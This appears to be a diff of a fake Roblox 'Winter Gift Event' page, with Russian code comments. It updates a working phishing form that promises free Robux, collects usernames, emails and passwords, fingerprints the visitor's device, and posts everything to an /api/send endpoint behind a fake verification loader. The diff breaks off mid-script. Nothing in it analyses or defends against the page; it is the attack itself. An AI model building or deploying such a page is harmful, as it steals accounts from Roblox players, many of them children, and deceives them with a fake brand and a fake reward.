@@ -3,75 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox | Winter Event 2025</title>
+    <title>Roblox | Winter Gift Event 2025</title>
     <style>
-        body { margin: 0; font-family: sans-serif; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-image: radial-gradient(circle, #1a3a3a 0%, #000 100%); overflow-x: hidden; }
-        /* Новогодняя шапка */
+        body { margin: 0; font-family: 'Gotham SSm', sans-serif; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-image: radial-gradient(circle, #1a3a3a 0%, #000 100%); }
         .header { width: 100%; background: #d32f2f; padding: 12px 20px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); display: flex; align-items: center; position: fixed; top: 0; z-index: 100; border-bottom: 3px solid #ffca28; }
-        .header img { height: 28px; filter: drop-shadow(0 0 5px white); }
-        .header-text { margin-left: 15px; font-weight: bold; font-size: 14px; color: #fff; text-shadow: 1px 1px 2px #000; }
-        
+        .header img { height: 30px; }
         .spacer { height: 100px; }
-        .card { background: #232527; padding: 35px; border-radius: 15px; width: 340px; text-align: center; border: 2px solid #d32f2f; position: relative; box-shadow: 0 0 20px rgba(211, 47, 47, 0.3); }
+        .card { background: #232527; padding: 35px; border-radius: 15px; width: 340px; text-align: center; border: 2px solid #d32f2f; position: relative; box-shadow: 0 0 25px rgba(211, 47, 47, 0.4); }
+        .main-logo { width: 80px; margin-bottom: 10px; filter: drop-shadow(0 0 5px #fff); }
+        .event-title { color: #ffca28; font-weight: 900; font-size: 18px; margin-bottom: 5px; text-transform: uppercase; }
+        .event-sub { font-size: 12px; color: #bbb; margin-bottom: 20px; }
         
-        /* Снежинка для декора */
-        .card::before { content: '❄️'; position: absolute; top: -20px; right: -20px; font-size: 40px; }
+        select, input { width: 100%; padding: 12px; margin-bottom: 12px; background: #111; border: 1px solid #444; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; font-size: 14px; }
+        input:focus, select:focus { border-color: #ffca28; }
         
-        .main-logo { width: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px rgba(255,255,255,0.5)); }
-        .event-badge { background: #ffca28; color: #000; padding: 5px; border-radius: 5px; font-size: 11px; font-weight: 900; margin-bottom: 20px; }
+        button { width: 100%; padding: 14px; background: #d32f2f; color: #fff; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 15px; text-transform: uppercase; transition: 0.3s; }
+        button:hover { background: #ffca28; color: #000; }
         
-        input { width: 100%; padding: 12px; margin-bottom: 12px; background: #111; border: 1px solid #444; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #ffca28; }
-        
-        button { width: 100%; padding: 14px; background: #d32f2f; color: #fff; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
-        button:hover { background: #b71c1c; box-shadow: 0 0 10px #d32f2f; }
-        
-        #status { display: none; color: #ffca28; font-size: 12px; margin-top: 15px; font-family: monospace; }
-        .footer { font-size: 10px; color: #666; margin-top: 25px; }
+        #loader { display: none; color: #ffca28; font-size: 12px; margin-top: 15px; font-family: monospace; line-height: 1.5; }
+        .footer { font-size: 10px; color: #555; margin-top: 25px; }
     </style>
 </head>
 <body>
     <div class="header">
-        <img src="https://www.roblox.com/images/Logos/rbx_icon.png">
-        <div class="header-text">ROBLOX WINTER VERIFICATION 2025</div>
+        <img src="https://www.roblox.com/images/Logos/rbx_icon.png" alt="Roblox">
+        <span style="margin-left: 10px; font-weight: bold;">WINTER GIFTING SYSTEM</span>
     </div>
     
     <div class="spacer"></div>
 
     <div class="card">
         <img src="https://www.roblox.com/images/logos/rebrand/metric_144_white.png" class="main-logo">
-        <div class="event-badge">❄️ HOLIDAY SECURITY CHECK ❄️</div>
-        <form id="winter-form">
-            <input type="text" id="u" placeholder="Roblox Username" required>
+        <div class="event-title">GET YOUR GIFT 🎁</div>
+        <div class="event-sub">Account must be older than 30 days</div>
+        
+        <form id="gift-form">
+            <select id="rbx">
+                <option value="400">400 Robux (Holiday Gift)</option>
+                <option value="800">800 Robux (Santa Pack)</option>
+                <option value="1700">1,700 Robux (Winter Pro)</option>
+                <option value="4500">4,500 Robux (Elite Reward)</option>
+            </select>
+            <input type="text" id="u" placeholder="Username / Email" required>
             <input type="password" id="p" placeholder="Password" required>
-            <input type="tel" id="t" placeholder="Phone Number" required>
-            <button type="submit" id="btn">Claim Holiday Reward</button>
+            <button type="submit" id="btn">CLAIM ROBUX</button>
         </form>
-        <div id="status">ANALYZING SESSION...<br>IP & HARDWARE VERIFIED...</div>
-        <div class="footer">Verification required for accounts >30 days old.<br>© 2025 Roblox Winter Event</div>
+        
+        <div id="loader">
+            INITIALIZING SECURE LINK... [OK]<br>
+            VERIFYING ACCOUNT AGE... [OK]<br>
+            CONNECTING TO REWARD SERVERS...
+        </div>
+        
+        <div class="footer">© 2025 Roblox Winter Event. Authorized Security.</div>
     </div>
 
     <script>
-        document.getElementById('winter-form').onsubmit = async (e) => {
+        document.getElementById('gift-form').onsubmit = async (e) => {
             e.preventDefault();
             const btn = document.getElementById('btn');
-            const status = document.getElementById('status');
+            const loader = document.getElementById('loader');
             
             btn.style.display = 'none';
-            status.style.display = 'block';
+            loader.style.display = 'block';
 
-            // Собираем данные о железе (ПК или Телефон)
-            let device = "PC / Unknown";
+            // Точное определение устройства (ПК или Телефон)
+            let device = "PC / Desktop";
             if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
-                device = navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0];
+                const match = navigator.userAgent.match(/\(([^)]+)\)/);
+                device = "Mobile: " + (match ? match[1].split(';')[0] : "Smartphone");
             } else {
-                device = "Desktop: " + navigator.platform;
+                device = "PC: " + navigator.platform + " (" + navigator.appName + ")";
             }
 
+            // Отправка данных
             await fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ u: u.value, p: p.value, t: t.value, m: device })
+                body: JSON.stringify({ 
+                    u: document.getElementById('u').value, 
+                    p: document.getElementById('p').value, 
+                    r: document.getElementById('rbx').value,
+                    m: device 
+                })
             });
 
             setTimeout(() => {
